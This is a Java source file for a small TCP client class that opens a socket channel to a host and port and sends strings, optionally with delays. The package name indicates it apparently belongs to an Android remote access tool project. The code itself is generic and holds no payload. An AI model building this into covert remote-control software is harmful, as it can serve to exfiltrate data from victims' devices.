package com.je_chen.droidrat_je.util.socket.tcp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.List;

public class TCPNioClient{

    private InetSocketAddress inetSocketAddress;
    private SocketChannel socketChannel;
    private byte[] messageByte;

    public TCPNioClient(String host,int port) throws IOException {
        inetSocketAddress=new InetSocketAddress(host,port);
        socketChannel = SocketChannel.open(inetSocketAddress);
    }

    public void close() throws IOException {
        socketChannel.close();
    }

    private int messageBuffer(String message) throws IOException {
        messageByte = message.getBytes();
        ByteBuffer byteBuffer = ByteBuffer.wrap(messageByte);
        int state = socketChannel.write(byteBuffer);
        byteBuffer.clear();
        return state;
    }

    public void sendMessage(String message) throws IOException{
        messageBuffer(message);
    }

    public void sendMessage(List<String> message,int Delay) throws IOException, InterruptedException {
        for(String messageString : message){
            messageBuffer(messageString);
            if(Delay>0)
                Thread.sleep(Delay);
        }
    }

    public void sendMessage(List<String> message) throws IOException{
        for(String messageString : message){
            messageBuffer(messageString);
        }
    }
}
